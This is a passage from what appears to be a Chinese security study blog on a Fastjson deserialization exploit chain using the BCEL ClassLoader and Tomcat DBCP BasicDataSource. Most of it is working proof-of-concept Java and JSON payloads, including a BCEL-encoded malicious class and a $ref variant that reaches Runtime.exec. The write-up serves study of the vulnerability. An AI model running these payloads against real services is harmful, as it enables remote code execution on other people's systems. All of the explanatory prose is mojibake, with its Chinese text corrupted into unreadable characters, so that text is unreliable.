org.apache.tomcat.dbcp.dbcp.BasicDataSource;</span><br><span class="line"><span class="comment">//import org.apache.commons.dbcp.BasicDataSource;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, SQLException &#123;</span><br><span class="line">        <span class="comment">//fj1.2.24</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">BasicDataSource</span> <span class="variable">basicDataSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BasicDataSource</span>();</span><br><span class="line">        basicDataSource.setDriverClassLoader(classLoader);</span><br><span class="line">        basicDataSource.setDriverClassName(str);</span><br><span class="line">        basicDataSource.getConnection();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼ŒæˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321094644237.png" alt="image-20240321094644237"></p><h2 id="BCEL-dbcp-fastjson">BCEL-dbcp-fastjson</h2><p>ä¸‹é¢å°†ä¼šå°†ä¸Šé¢æ‰€è¯´çš„bcelï¼Œdbcpå’Œfjç»“åˆèµ·æ¥ï¼Œåˆ©ç”¨fjè§¦å‘è¯¥åˆ©ç”¨é“¾</p><p>åˆ©ç”¨é“¾å…¥å£å°±æ˜¯ä¸Šé¢æåˆ°çš„BasicDataSource#getConnectionæ–¹æ³•ï¼Œä½†è¯¥ç±»å¹¶æ²¡æœ‰Connectionæˆå‘˜å˜é‡ï¼Œé‚£ä»–æ˜¯å¦‚ä½•è°ƒç”¨çš„å‘¢ï¼Ÿ</p><p><strong>FastJsonä¸­çš„ parse() å’Œ parseObject()æ–¹æ³•éƒ½å¯ä»¥ç”¨æ¥å°†JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–æˆJavaå¯¹è±¡ï¼ŒparseObject() æœ¬è´¨ä¸Šä¹Ÿæ˜¯è°ƒç”¨ parse() è¿›è¡Œååºåˆ—åŒ–çš„ã€‚ä½†æ˜¯ parseObject() ä¼šé¢å¤–çš„å°†Javaå¯¹è±¡è½¬ä¸º JSONObjectå¯¹è±¡ï¼Œå³ JSON.toJSON()ã€‚æ‰€ä»¥è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œparse() ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ setter æ–¹æ³•åŠæŸäº›ç‰¹å®šæ¡ä»¶çš„ getter æ–¹æ³•(è¯¦è§fjçš„è§¦å‘è¯¦ç»†è¿‡ç¨‹)ï¼Œè€Œ parseObject() ç”±äºå¤šæ‰§è¡Œäº† JSON.toJSON(obj)ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„æ‰€æœ‰ setter å’Œ getter æ–¹æ³•ã€‚</strong></p><p>å…ˆç»™å‡ºæµ‹è¯•POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.dbcp.dbcp.BasicDataSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, SQLException &#123;</span><br><span class="line">        <span class="comment">//fj1.2.24</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span></span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;        \&quot;aaa\&quot;: &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                &#125;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;&quot;</span>+str+<span class="string">&quot;\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;        &#125;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;    &#125;:\&quot;xxx\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(str);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;aaa&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">:</span><span class="string">&quot;xxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åˆ©ç”¨parse()æ–¹æ³•çš„æ—¶å€™</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321140349525.png" alt="image-20240321140349525"></p><p>ç»“åˆpayloadå¯å¾—åœ¨è¿™é‡Œç”±äºkeyä¸ä¸ºnullï¼Œæ‰€ä»¥è°ƒç”¨äº†toStringæ–¹æ³•ï¼Œkeyä¸º<code>JSONObject</code>å¯¹è±¡ï¼Œä¼šè°ƒç”¨è¯¥å¯¹è±¡çš„toStringæ–¹æ³•ã€‚è€Œä¸”JSONObjectæ˜¯Mapçš„å­ç±»ï¼Œå½“è°ƒç”¨<code>toString</code>çš„æ—¶å€™ï¼Œä¼šä¾æ¬¡è°ƒç”¨è¯¥ç±»çš„getteræ–¹æ³•è·å–å€¼ï¼ˆå¯¹äºgetConnectionçš„è§¦å‘è¿˜æœ‰ä¸€ç§è§£é‡Š<strong><a href="https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904">https://github.com/alibaba/fastjson/blob/master/src/main/java/com/alibaba/fastjson/util/TypeUtils.java#L1904</a></strong>ï¼‰ï¼Œè¿›è€Œè§¦å‘geté“¾ï¼Œä¸Šé¢å·²ç»ç»™å‡ºäº†JSON.parseçš„æµ‹è¯•ä»£ç ï¼Œä¸‹é¢æ˜¯JSON.parseObjectçš„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;</span><br><span class="line"><span class="comment">//import org.apache.tomcat.dbcp.dbcp.BasicDataSource;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FjBCEL</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, SQLException &#123;</span><br><span class="line">        <span class="comment">//fj1.2.24</span></span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassLoader</span>();</span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">javaClass</span> <span class="operator">=</span> Repository.lookupClass(classloader.Calc.class);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;\$\$BCEL\$\$&quot;</span>;</span><br><span class="line">        str += Utility.encode(javaClass.getBytes(),<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource\&quot;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                    \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                &#125;,\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;                \&quot;driverClassName\&quot;: \&quot;&quot;</span>+str+<span class="string">&quot;\&quot;\n&quot;</span></span><br><span class="line">                        + <span class="string">&quot;        &#125;&quot;</span>;</span><br><span class="line">        JSON.parseObject(payload);</span><br><span class="line"><span class="comment">//        BasicDataSource basicDataSource = new BasicDataSource();</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassLoader(classLoader);</span></span><br><span class="line"><span class="comment">//        basicDataSource.setDriverClassName(str);</span></span><br><span class="line"><span class="comment">//        basicDataSource.getConnection();</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\$\$BCEL\$\$$l$8b$I$A$A$A$A$A$A$Am$91$c9N$c3$40$M$86$ffi$d3$s$N$v$85B$d9$f7$b5p$a0$H$8e$m$$$I$$$84E$U$c1y$3a$j$95$viR$rS$c4$hq$e6$C$88$D$P$c0C$n$3ca$V$Q$vv$fc$db$fel$x$_$afO$cf$A6$b1$e2$c2$c1$a8$8b1$8c$3b$980$7e$d2$c6$94$8b$i$a6m$cc$d8$98e$c8o$abP$e9$j$86lu$ed$9c$c1$da$8d$9a$92$a1$e4$abP$k$f5$3a$N$Z$9f$f1F$40J$d9$8f$E$P$cey$acL$fc$nZ$faR$r$s$t$C$9e$qA$c4$9b2$ae$ed$f2$40l18$db$o$f8$403$w$ad$f8m$7e$cdk$B$P$5b$b5$bd$h$n$bbZE$n$95$V$eb$9a$8b$abC$deM$91$b4$j$83$5b$8fz$b1$90$fb$ca$8c$u$Y$dc$86$e9$f5P$80kc$ce$c3$3c$Wh6$ad$p$3c$yb$89a$e8$l$b6$87e$b8$M$D$bfW$p$e9$bb$fa$b8$d1$96B3$M$7eK$a7$bdP$ab$OMv$5bR$7f$F$95$ea$9a$ff$a7$86$d6$b7$e4$8d$q$e4j$f5G$b6$aec$V$b6$b6$7e6$9c$c4$91$90IB$N$a5$$$ruz$f4Y$cc$85$a4cl$faI$e6$c9$80$99$T$c9$f6QT$p$cf$c8$e7$d6$l$c0$ee$d2$b4G6$9f$8aY$U$c9z$ef$F$e8G$89$bc$83$81$aff$9e$c2$80$f2$p2$e5$ec$3d$ac$8b$5b8$H$eb$f7$c8$df$a5z$81zsD1$c4$R$fa2$dcB$aa$daDv0H$a4$cf$JEX$U$97$v$g$a2$d7F$c6$b71lQ$a2$92$$5$f2$G$933$ed$e9n$C$A$A&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æ ¹æ®åŒ…ç‰ˆæœ¬çš„ä¸åŒpayloadä¼šç•¥æœ‰å·®å¼‚ï¼Œæœ‰äº›åŒ…è°ƒç”¨çš„å¯èƒ½å°±æ˜¯org.apache.tomcat.dbcp.dbcp2.BasicDataSource</p><p>ç±»è·¯å¾„éœ€è¦æ ¹æ®å®é™…æƒ…å†µè€Œå®šï¼Œè¿è¡Œç»“æœ</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240321175438078.png" alt="image-20240321175438078"></p><p>ä»¥ä¸Šæ–¹æ³•åªé’ˆå¯¹äºfj&lt;=1.2.36ç‰ˆæœ¬çš„æƒ…å†µï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ</p><p>ä¸‹å›¾ä¸ºfj1.2.37ä¸­çš„keyéƒ¨åˆ†ï¼Œå‘ç°å·²ç»æ²¡æœ‰äº†toStringæ–¹æ³•ï¼Œä¹‹å‰å¯¹äºJSON.parseå’ŒJSON.parseObjectçš„payloadéƒ½æ˜¯é€šè¿‡å°†keyè®¾ç½®ä¸ºJSONObjectå¯¹è±¡æ¥è§¦å‘toStringï¼Œè¿›è€Œä¾æ¬¡è°ƒç”¨è¯¥ç±»çš„getteråŠ è½½æ¶æ„ä»£ç ï¼Œå¦‚æœæ²¡æœ‰äº†toStringï¼Œé‚£ä¹ˆpayloadä¹Ÿå°±å¤±å»äº†ä½œç”¨</p><p><img src="../%E7%AC%94%E8%AE%B0%E5%9B%BE/image-20240322005147162.png" alt="image-20240322005147162"></p><h2 id="é€šè¿‡-refè¿›è¡Œè°ƒç”¨">é€šè¿‡$refè¿›è¡Œè°ƒç”¨</h2><p>æ¥ä¸‹æ¥çš„æµ‹è¯•æˆ‘çš„fjæ¢æˆäº†1.2.37</p><p><strong>ä»€ä¹ˆæ˜¯ref</strong></p><p>refæ˜¯fastjsonç‰¹æœ‰çš„JSONPathè¯­æ³•ï¼Œç”¨æ¥å¼•ç”¨ä¹‹å‰å‡ºç°çš„å¯¹è±¡</p><p><strong>ä»€ä¹ˆæ˜¯JSONPath</strong></p><p><a href="https://blog.csdn.net/itguangit/article/details/78764212">https://blog.csdn.net/itguangit/article/details/78764212</a></p><p>æµ‹è¯•ä»£ç </p><p>RefTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RefTest</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String cmd;</span><br><span class="line">    <span class="keyword">private</span> String test;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setTest</span><span class="params">(String test)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.test=test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">setTest</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setCmd</span><span class="params">(String cmd)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.cmd = cmd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getCmd</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(cmd);</span><br><span class="line">        <span class="keyword">return</span> cmd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BCEL_refTest.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL_refTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;[&#123;\&quot;@type\&quot;:\&quot;classloader.RefTest\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;classloader.RefTest\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;,\&quot;test\&quot;:\&quot;test\&quot;&#125;,&#123;\&quot;$ref\&quot;:\&quot;$[1].cmd\&quot;&#125;]&quot;</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;classloader.RefTest&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;calc&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;$ref&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$[1].cmd&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹jsonpathåœ¨è¯¥payloadé‡Œçš„ä½œç”¨ï¼Œ$[1]ä»£è¡¨å¼•ç”¨äº†å½“å‰æ•°ç»„çš„ç¬¬äºŒä¸ªå˜é‡ï¼Œä¹Ÿå°±æ˜¯</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;classloader.RefTest&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cmd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;calc&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;test&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>.cmdä»£è¡¨è·å–è¯¥å¯¹è±¡ä¸­cmdçš„å€¼ï¼Œç›¸æ¯”äºä¹‹å‰çš„payloadï¼Œ$refä¸»è¦æ˜¯é€šè¿‡JSONPathçš„å½¢å¼è¿›è¡Œäº†å¯¹è±¡å’Œå±æ€§çš„è°ƒç”¨ï¼Œåˆ©ç”¨åå°„è¿›è¡Œå®ä¾‹åŒ–ï¼Œè¿›è€Œæ‰§è¡Œæ¶æ„æ–¹æ³•ã€‚åŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡$refè°ƒç”¨ä¸Šé¢è¯´åˆ°çš„connectionï¼Œè¿›è€Œè§¦å‘ä»–çš„getæ–¹æ³•</p><p>æµ‹è¯•ä»£ç ï¼š</p><p><strong>BCEL_refTest.java</strong></p><p>è¿è¡Œçš„æ—¶å€™æŠ¥äº†ä¸¤æ¬¡é”™ï¼Œåº”è¯¥æ˜¯tomcatç‰ˆæœ¬çš„é—®é¢˜ï¼Œé«˜ç‰ˆæœ¬åŠ äº†waf</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> classloader;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BCEL_refTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span 